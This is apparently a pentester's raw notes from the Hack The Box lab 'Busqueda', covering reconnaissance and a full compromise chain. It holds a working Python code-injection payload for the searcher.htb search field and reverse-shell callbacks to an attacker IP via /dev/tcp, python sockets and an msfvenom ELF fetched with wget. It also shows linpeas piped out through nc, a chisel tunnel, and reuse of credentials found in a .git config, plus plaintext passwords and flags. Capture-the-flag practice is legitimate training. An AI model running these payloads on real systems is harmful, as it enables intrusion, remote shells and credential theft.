@@ -1,0 +1,1129 @@
+2023-04-11 23:27:15 CDT -- START TIME
+
+### Busqueda ###
+----------------------------------------
+
+|================================================================
+- Name: busqueda
+- IP Address: 10.129.198.171
+- OS: Ubuntu 22.04.2 LTS /x64
+- Notes: 
+
+//CREDS:
+// svc : jh1usoih2bkjaspwe92
+
+//Gitea Website
+// cody	: jh1usoih2bkjaspwe92
+// administrator : yuiu1hoiu4i5ho1uh
+
+//MySQL
+// gitea : yuiu1hoiu4i5ho1uh
+
+//Flags:
+//User:		07288dcbef44744f62a910d0b123ab42
+//System:	11aa94ced776a2722042c1322487d33c
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.10.11.208
+
+2023-04-11 23:32:53 CDT -- 
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80
+
+2023-04-11 23:34:01 CDT -- 
+nmap -e tun0 -Pn -A -sC -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# UDP scan
+2023-04-11 23:35:14 CDT -- 
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.10.11.208\t searcher.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# feroxbuster use (-k = Disable TLS verification; -e = do directory listing when possible; -q = quiet)
+2023-04-11 23:40:54 CDT -- 
+feroxbuster -u http://searcher.htb/ -o ferox.out
+
+405 http://searcher.htb/search
+200 http://searcher.htb/
+403 http://searcher.htb/server-status
+
+2023-04-11 23:56:00 CDT -- 
+//Testing w/ extensions
+feroxbuster -u http://searcher.htb/ -x php,txt,html,htm,aspx -o ferox.out
+//No changes, just took longer
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// scan website
+2023-04-12 00:01:38 CDT -- 
+nikto -h http://searcher.htb/ -o nikto_scan.txt
+//Nothing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Burp:
+http://searcher.htb/
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Info: Search anything with Searcher! The capabilities range from social media platforms to encyclopedias, to Q&A sites, and to much more. Choose from our huge collection of search engines, including YouTube, Google, DuckDuckGo, eBay and various other platforms.
+//To start:
+1. Simply select the engine you want to use.
+2. Type the query you want to be searched.
+3. Finally, hit the "Search" button to submit the query.
+
+//If you want to get redirected automatically, you can tick the check box. Then you will be automatically redirected to the selected engine with the results of the query you searched for. Otherwise, you will get the URL of your search, which you can use however you wish.
+
+//Without Redirect Checked
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Request
+POST /search HTTP/1.1
+Host: searcher.htb
+Origin: http://searcher.htb
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+engine=Google&query=hacking
+
+//Response
+HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.6
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Connection: close
+
+https://www.google.com/search?q=hacking
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//With Redirect Checked
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Request
+POST /search HTTP/1.1
+Host: searcher.htb
+Origin: http://searcher.htb
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+engine=Google&query=hacking&auto_redirect=
+
+//Response
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.1.2 Python/3.10.6
+Location: https://www.google.com/search?q=hacking
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="https://www.google.com/search?q=hacking">https://www.google.com/search?q=hacking</a>. If not, click the link.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//NOTE: The server is running: Werkzeug/2.1.2 Python/3.10.6.
+
+// Testing Python Command Exeuction w/ BURP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+__import__('os').system('id') 		//Nothing
+'__import__('os').system('id')'		//Nothing
+
+//Adding Plus make it look more like a query
+'+__import__('os').system('id')+'	//Nothing
+//Percent Encode (+=%2b)
+'%2b__import__('os').system('id')%2b'
+
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+//SUCCESS!!
+
+//Full %URL Encode:
+%27%2B__import__%28%27os%27%29.system%28%27id%27%29%2B%27
+
+//Generate Curl Command from BURP
+curl -i -s -k -X $'POST' -H $'Host: searcher.htb' -H $'Content-Length: 57' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://searcher.htb' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://searcher.htb/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'id\')%2b\'' $'http://searcher.htb/search'
+
+//Removing Extra info:
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'id\')%2b\''
+
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RevShell (svc)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-12 01:48:17 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'pwd\')%2b\''
+
+/var/www/app
+
+2023-04-12 01:49:13 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah\')%2b\''
+
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Apr 11 23:25 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
+
+2023-04-12 02:36:24 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'hostname\')%2b\''
+
+busqueda
+
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'cat /etc/*elease\')%2b\''
+
+PRETTY_NAME="Ubuntu 22.04.2 LTS"
+
+
+2023-04-12 02:01:25 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'cat /etc/passwd\')%2b\''
+
+root:x:0:0:root:/root:/bin/bash
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+
+//Generate RevShell
+# Payload: /bin/bash -i >& /dev/tcp/10.10.16.13/443 0>&1
+# Encoded: %2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261
+
+//Start Listener
+sudo rlwrap -cAr nc -lvnp 443
+
+//Connect
+2023-04-12 02:05:15 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'/bin/bash -i >& /dev/tcp/10.10.16.13/443 0>&1\')%2b\''
+//FAIL
+
+2023-04-12 02:17:22 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F443%200%3E%261\')%2b\''
+//FAIL
+
+2023-04-12 02:09:26 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'python%20-V\')%2b\''
+//Nothing
+
+2023-04-12 02:09:44 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'python3%20-V\')%2b\''
+
+Python 3.10.6
+
+2023-04-12 02:28:14 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'export%20RHOST%3D%2210.10.16.13%22%3Bexport%20RPORT%3D443%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27\')%2b\''
+//FAIL
+
+//Not able to use shell callbacks, trying a binary
+
+// generate msfvenom binary
+2023-04-12 02:40:32 CDT -- 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.13 LPORT=443 -f elf -o reverse.elf
+
+//Start Python webserver
+sudo python -m http.server 443
+
+2023-04-12 02:43:35 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'which wget\')%2b\''
+
+/usr/bin/wget
+
+2023-04-12 02:46:49 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'wget http://10.10.16.13:6969/reverse.elf -O /tmp/reverse.elf \')%2b\''
+
+2023-04-12 02:48:07 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /tmp/reverse.elf\')%2b\''
+-rw-r--r-- 1 svc svc 194 Apr 12 07:41 /tmp/reverse.elf
+
+2023-04-12 02:51:03 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'chmod %2Bx /tmp/reverse.elf\')%2b\''
+
+2023-04-12 02:51:05 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /tmp/reverse.elf\')%2b\''
+-rwxr-xr-x 1 svc svc 194 Apr 12 07:41 /tmp/reverse.elf
+
+2023-04-12 02:54:00 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'/tmp/reverse.elf\')%2b\''
+
+//SUCCESS
+
+id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//ENUM (svc)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# UPgrade shell python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+2023-04-12 02:57:59 CDT -- 
+ls /home
+svc
+
+ls -lah /home/svc/
+
+2023-04-12 02:59:05 CDT -- 
+cat /home/svc/user.txt
+//07288dcbef44744f62a910d0b123ab42
+
+2023-04-12 03:06:18 CDT -- 
+netstat -pant
+
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:222           0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:42767         0.0.0.0:*         LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*         LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*         LISTEN      1639/python3
+
+//3306 = MySQL
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+2023-04-12 03:14:50 CDT -- 
+which curl
+/usr/bin/curl
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 6969
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+  // target
+2023-04-12 03:16:05 CDT -- 
+curl 10.10.16.13:6969/linpeas.sh | sh | nc 10.10.16.13 443
+
+╔══════════╣ CVEs Check
+Potentially Vulnerable to CVE-2022-0847
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2022-0847] DirtyPipe
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+╔══════════╣ Container related tools present
+/usr/bin/docker                                                                               /usr/sbin/runc
+
+╔══════════╣ Container details                                                                                                     
+═╣ Is this a container? ........... No                                                                                             
+═╣ Any running containers? ........ No
+
+svc         1639  4.0  Ssl  Apr11  21:37 python3 /var/www/app/app.py
+
+╔══════════╣ Interfaces
+br-c954bf22b8b2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
+br-cbf2c5ce8e95: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+br-fba5a3e31476: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                                                                       
+        inet 10.10.11.208  netmask 255.255.254.0  broadcast 10.10.11.255
+
+╔══════════╣ Users with console
+root:x:0:0:root:/root:/bin/bash                                                               svc:x:1000:1000:svc:/home/svc:/bin/bash
+
+╔══════════╣ MySQL version
+mysql  Ver 8.0.32-0ubuntu0.22.04.2 for Linux on x86_64 ((Ubuntu)) 
+
+╔══════════╣ Searching mysql credentials and exec
+Found lib_mysqludf_sys.so:                                                                                                                       
+If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');
+
+══╣ PHP exec extensions
+ServerName searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+
+//.git files/dirs
+-rw-rw-r-- 1 svc svc 76 Apr  3 08:58 /home/svc/.gitconfig
+drwxr-x--- 8 root root 4096 Apr  3 15:04 /opt/scripts/.git
+drwxr-xr-x 8 www-data www-data 4096 Apr 11 23:25 /var/www/app/.git
+
+╔══════════╣ Checking if runc is available
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation                                                   
+runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
+
+
+
+2023-04-12 03:43:27 CDT -- 
+cat /home/svc/.gitconfig
+[user]
+        email = cody@searcher.htb
+        name = cody
+[core]
+        hooksPath = no-hooks
+
+2023-04-12 03:45:41 CDT -- 
+ls -lah /var/www/app/.git
+total 52K
+drwxr-xr-x 8 www-data www-data 4.0K Apr 11 23:25 .
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 ..
+-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 branches
+-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 info
+drwxr-xr-x 3 www-data www-data 4.0K Dec  1 14:35 logs
+drwxr-xr-x 9 www-data www-data 4.0K Dec  1 14:35 objects
+drwxr-xr-x 5 www-data www-data 4.0K Dec  1 14:35 refs
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-12 19:19:47 CDT -- AFTER BREAK
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.42.176\tsearcher.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RE-DO RevShell
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 -f elf -o reverse.elf
+
+2023-04-12 19:24:53 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'id\')%2b\''
+
+2023-04-12 19:25:31 CDT -- 
+python3 -m http.server 443
+
+2023-04-12 19:26:02 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'wget http://10.10.16.13:443/reverse.elf -O /tmp/reverse.elf\')%2b\''
+//FAIL
+//502 Proxy Error
+//The proxy server received an invalid response from an upstream server.
+// The proxy server could not handle the request
+//Reason: Error reading from remote server
+
+2023-04-12 21:39:14 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /home\')%2b\''
+
+total 12K
+drwxr-xr-x  3 root root 4.0K Dec 22 18:56 .
+drwxr-xr-x 19 root root 4.0K Mar  1 10:46 ..
+drwxr-x---  4 svc  svc  4.0K Apr  3 08:58 svc
+
+2023-04-12 21:40:01 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /home/svc\')%2b\''
+
+total 36K
+drwxr-x--- 4 svc  svc  4.0K Apr  3 08:58 .
+drwxr-xr-x 3 root root 4.0K Dec 22 18:56 ..
+lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
+-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 svc  svc  3.7K Jan  6  2022 .bashrc
+drwx------ 2 svc  svc  4.0K Feb 28 11:37 .cache
+-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
+drwxrwxr-x 5 svc  svc  4.0K Jun 15  2022 .local
+lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
+-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
+lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
+-rw-r----- 1 root svc    33 Apr 13 00:57 user.txt
+
+2023-04-12 21:40:05 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'wget 10.10.16.3:443/reverse.elf -O /home/svc/reverse.elf\')%2b\''
+
+2023-04-12 21:40:09 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'md5sum /home/svc/reverse.elf\')%2b\''
+
+d30ad97db8ed56ca28b8ebc68a732d3c  /home/svc/reverse.elf
+
+2023-04-12 21:40:49 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'chmod %2Bx /home/svc/reverse.elf\')%2b\''
+
+2023-04-12 21:40:55 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'ls -lah /home/svc/reverse.elf\')%2b\''
+-rwxr-xr-x 1 svc svc 194 Apr 13 00:51 /home/svc/reverse.elf
+
+
+2023-04-12 21:41:00 CDT -- 
+sudo rlwrap -cAr nc -lvnp 443
+
+2023-04-12 21:41:37 CDT -- 
+curl -k http://searcher.htb/search --data-binary $'engine=Google&query=\'%2b__import__(\'os\').system(\'/home/svc/reverse.elf\')%2b\''
+//SUCCESS
+
+2023-04-12 21:43:02 CDT -- 
+# UPgrade shell python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (svc)
+// Based on previous linpeas
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+sudo -ll
+//Do not know svc password
+
+ps -ef fw
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+svc         1430    1311  0 00:56 ?        Ssl    0:02 python3 /var/www/app/app.py
+svc         2870    1430  0 02:37 ?        S      0:00  \_ /usr/bin/python3 /usr/local/bin/searchor search Google '+__import__('os')
+svc         2871    2870  0 02:37 ?        S      0:00      \_ sh -c /home/svc/reverse.elf
+svc         2872    2871  0 02:37 ?        S      0:00          \_ /bin/sh
+svc         2892    2872  0 02:43 ?        S      0:00              \_ python3 -c import pty; pty.spawn("/bin/bash")
+svc         2893    2892  0 02:43 pts/0    Ss     0:00                  \_ /bin/bash
+svc         2944    2893  0 02:56 pts/0    R+     0:00                      \_ ps -ef fw
+
+netstat -pant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1430/python3        
+tcp        0      0 127.0.0.1:39893         0.0.0.0:*               LISTEN      -                   
+tcp        1      0 127.0.0.1:5000          127.0.0.1:40322         CLOSE_WAIT  1430/python3        
+tcp        0     15 10.129.42.176:34510     10.10.16.3:443          ESTABLISHED 2872/sh             
+tcp        0      1 10.129.42.176:42900     8.8.8.8:53              SYN_SENT    -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+
+
+//.git files/dirs
+-rw-rw-r-- 1 svc svc 76 Apr  3 08:58 /home/svc/.gitconfig
+drwxr-x--- 8 root root 4096 Apr  3 15:04 /opt/scripts/.git
+drwxr-xr-x 8 www-data www-data 4096 Apr 11 23:25 /var/www/app/.git
+
+2023-04-12 21:48:19 CDT -- 
+cat /home/svc/.gitconfig
+[user]
+        email = cody@searcher.htb
+        name = cody
+[core]
+        hooksPath = no-hooks
+
+2023-04-12 21:49:17 CDT -- 
+egrep -ri cody /var/www/app/.git
+
+.git/config:    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+
+//Possible Creds:
+//cody:jh1usoih2bkjaspwe92
+
+//Check SSH (22)
+2023-04-12 21:58:31 CDT -- 
+crackmapexec ssh 10.129.42.176 -u cody -p jh1usoih2bkjaspwe92
+//[-] Cody:jh1usoih2bkjaspwe92 Authentication failed.
+
+crackmapexec ssh 10.129.42.176 -u svc -p jh1usoih2bkjaspwe92
+//[+] svc:jh1usoih2bkjaspwe92
+//SUCCESS
+
+
+//Check MySQL (127.0.0.1:3306)
+2023-04-12 22:00:42 CDT -- 
+which mysql
+/usr/bin/mysql
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- mysql client --
+//cody:jh1usoih2bkjaspwe92
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-12 22:02:59 CDT -- 
+# interactive login
+mysql --host=127.0.0.1 --port=3306 --user=cody --password=jh1usoih2bkjaspwe92
+
+mysql: [Warning] Using a password on the command line interface can be insecure.
+ERROR 1045 (28000): Access denied for user 'cody'@'172.19.0.1' (using password: YES)
+
+2023-04-12 22:04:00 CDT -- 
+mysql --host=127.0.0.1 --port=3306 --user=cody
+ERROR 1045 (28000): Access denied for user 'cody'@'172.19.0.1' (using password: NO)
+
+2023-04-13 00:23:01 CDT -- 
+mysql --host=127.0.0.1 --port=3306 --user=svc --password=jh1usoih2bkjaspwe92
+ERROR 1045 (28000): Access denied for user 'svc'@'172.19.0.1' (using password: YES)
+
+2023-04-13 00:24:04 CDT -- 
+mysql --host=127.0.0.1 --port=3306 --user=svc
+ERROR 1045 (28000): Access denied for user 'svc'@'172.19.0.1' (using password: NO)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo apt install chisel
+
+// browse to https://github.com/jpillora/chisel/releases
+// get correct download links
+
+
+// download chisel for linux
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+
+gunzip chisel_1.8.1_linux_amd64.gz
+chmod +x chisel_1.8.1_linux_amd64
+mv chisel_1.8.1_linux_amd64 chisel
+
+
+// linux server with target client calling back
+  // kali
+sudo chisel server --port 6969 --reverse --socks5
+
+sudo python3 -m http.server 80
+
+  // target
+// upload chisel.exe
+cd /home/svc
+2023-04-12 22:18:30 CDT -- 
+wget http://10.10.16.3:80/chisel
+
+chmod +x chisel
+
+2023-04-12 22:26:53 CDT -- 
+// socks5 proxy
+./chisel client --fingerprint PIYd76QUuNoNAAefDN8RRnnI6xiSjoJa0j4KIvrN/1s= 10.10.16.3:6969 R:9050:socks
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// WebBrowse through chisel
+//cody:jh1usoih2bkjaspwe92
+//SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+══╣ PHP exec extensions
+ServerName searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+
+//FoxyProxy Settings
+127.0.0.1 SOCKS5 9050
+
+//Browse
+http://127.0.0.1:3000
+
+//Sign-IN
+//cody:jh1usoih2bkjaspwe92
+
+//SUCCESS
+
+//It is a git repo for the app.py searcher website
+// cody/Searcher_site repo
+// http://127.0.0.1:3000/cody/Searcher_site/raw/branch/main/app.py
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap through chisel proxy
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=127.0.0.1
+ports=3306,222,53,3000,5000,39893
+
+echo $ports
+// 3306,222,53,3000,5000,39893
+
+2023-04-12 23:33:50 CDT -- 
+proxychains4 -q nmap -Pn -sV -p$ports $ip -oN tcp_proxy.nmap
+
+PORT      STATE  SERVICE VERSION
+53/tcp    closed domain
+222/tcp   open   ssh     OpenSSH 9.0 (protocol 2.0)
